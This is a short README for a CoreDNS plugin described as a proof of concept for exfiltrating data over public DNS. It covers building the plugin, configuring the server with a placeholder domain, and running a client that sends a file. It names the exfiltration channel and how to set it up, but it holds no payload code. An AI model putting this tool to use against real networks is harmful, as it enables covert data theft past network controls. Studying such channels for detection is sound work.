# exfiltration plugin for coredns

This plugin is a proof of concept data exfiltration via public DNS infrastructure

## Installation

Clone the coredns repository

    git clone https://github.com/coredns/coredns.git

Add the plugin to the `plugin.cfg`, I recommend to put it after the `file:file` line.

    exfil:github.com/jpicht/exfil/lib/exfil

Build and deploy the server. A very basic example client is contained in the cmd/client subdirectory.

## Server configuration

Add the plugin to the Corefile

    exfil.example.com. {
        exfil exfil.example.com. /srv/exfil
    }

The syntax is:

    exfil $DOMAIN $PATH

## Usage

    client <domain> <filename>
